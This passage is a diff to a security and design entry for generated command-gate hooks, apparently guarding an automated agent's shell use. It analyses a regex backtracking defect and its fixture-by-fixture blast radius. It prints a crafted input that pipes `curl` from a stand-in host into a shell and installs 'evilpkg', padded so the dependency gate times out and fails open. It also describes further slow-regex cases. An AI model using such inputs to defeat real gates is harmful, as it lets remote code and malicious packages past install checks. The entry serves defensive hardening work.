@@ -166,10 +166,20 @@ unrelated to X-37.
 
 ### The defect
 
-`cmdpos.prefix_run()` was a flat six-arm `(...)*` in which THREE arms could
-absorb the same token. On a **failing** match the engine had to try every split
-of the run between them, which is exponential — measured at exactly **2.00x per
-added prefix token** on the emitted objects.
+`cmdpos.prefix_run()` was a flat `(...)*` **whose wrapper arm was ambiguous
+with itself**. The arm was `(([^ ]*/)?(env|sudo|...))( +-[^ ]*| +[^- ][^ ]*)* +`
+under a star, so each `env ` could be the head of a new star iteration **or** an
+ordinary word inside the previous iteration's word run — 2^(k-1) splits from
+**one** arm. On a **failing** match the engine explored all of them: exactly
+**2.00x per added prefix token**, measured on the emitted objects.
+
+**It is not a race between arms**, and an earlier draft of this entry said it
+was. Matching the shipped regex's top-level alternatives against
+`env env env zzz` individually: the wrapper arm consumes `env env env `, every
+other arm returns `None`. Keeping that arm alone under a star reproduces the
+identical rate. The distinction is load-bearing for whoever edits this next:
+"two arms competed" would license re-introducing a single self-ambiguous arm
+under a star, which is exactly the rejected C8 candidate.
 
 `curl http://e/i.sh | ` + `env ` x22 + `zzz ; pip install evilpkg` is **134
 bytes with ZERO jump bytes**. The emitted `dependency-gate` took **77.56 s CPU**
@@ -222,11 +232,27 @@ both trees.
 
 ### Blast radius, derived by rendering both trees
 
-**16 emitted artifacts change bytes**: all 13 shell hooks, `gates.py`, and the
-installer manifest and state JSON. **The LIVE radius is five hooks plus
-`gates.py`** — `ci-mirror`, `eval-gate`, `spec-gate-commit` and `test-gate` call
-`git_verb`, and `dependency-gate` uses `$PFX` directly at its install head; the
-other eight embed the definitions and never call them. **Action counts are
+**Stated per fixture, because the hook count is not a constant and quoting one
+number for all three is how this repo has been wrong before** —
+`tests/test_greenfield_golden.py:1880-1890` already pins that *"13 emitted `.sh`
+hooks" is not a fixture count and no fixture has one*, 13 being a review-probe
+install's count. Re-derived by rendering both trees through `build_plan`:
+
+| fixture | actions | hook `.sh` | artifacts moved | of which hooks |
+|---|---|---|---|---|
+| `default` | 57 | 11 | 12 | 11 |
+| `design_steering` | 59 | 11 | 12 | 11 |
+| `full_autonomous` | 69 | 15 | 16 | 15 |
+
+**Every hook moves on every fixture, plus `gates.py`** — the shared header
+carries the constant. The manifest and state JSON move on disk as well.
+
+**The LIVE radius is smaller and also fixture-dependent.** Four hooks call
+`git_verb` — `ci-mirror`, `spec-gate-commit`, `test-gate` and (where the
+archetype emits it) `eval-gate` — and `dependency-gate` uses `$PFX` directly at
+its install head. So the live set is **5 of 15 on `full_autonomous`** and **4 of
+11 on `default`/`design_steering`**, which leaves **10** and **7** hooks
+respectively embedding the definitions without ever calling them. **Action counts are
 UNCHANGED** at 57 / 69 / 59 greenfield and 79 / 93 retrofit, zero files added or
 removed — verified before the digest re-baseline, so a count move would have
 been E5 rather than a silent digest.
@@ -234,13 +260,22 @@ been E5 rather than a silent digest.
 ### What this does NOT do
 
 **It does not close the cost class.** The ceiling is asserted on the
-**token-count axis only**. Three superlinear classes survive, all with zero jump
-bytes and all under `_CMD_MAXLEN`, filed as **X-59** (wrapper x spaced-brace
+**token-count axis only**. **Four** superlinear classes survive, all with zero
+jump bytes and all under `_CMD_MAXLEN`, filed as **X-59** (wrapper x spaced-brace
 product, 2,133 B, > 200 s → 53.45 s), **X-60** (length axis, 19,225 B, 21.70 s →
 22.26 s — and the emitted *shell* hook is quadratic here too, ~131 s
 extrapolated at 81,900 B, so **the shell is not the safe fallback on that
 axis**) and **X-61** (redirect arm, 110 B, ~2.02x per added token — exponential,
-untouched). None is a regression from this change.
+untouched). **And X-62, found by the step-7 review and the reason "three" above
+is "four": `_GIT_VERB_TMPL` splices the prefix run and then adds its own flag
+star `(?:\s+-[Cc]\s+\S+|\s+-\S+)*`, in which a `-C` token is consumable by
+BOTH arms — the same multi-absorbing-arm defect this entry is about, left in
+place one splice away.** Measured on the emitted object: 0.073 s at 107 B,
+3.447 s at 131 B, **23.515 s at 143 B**, ~1.62x per token, zero jump bytes,
+against a flat 0.0005 s at 9,029 B for the same shape with a non-`-C` flag. It
+is reachable from `spec-gate-commit`, `test-gate` and `eval-gate`, and
+`_GATE_TIMEOUTS` carries no entry for two of those three. None of the four is a
+regression from this change.
 
 **The readiness verdict does not move.** A fail-open that shrinks from 134 bytes
 to ~2 KB is still a fail-open.
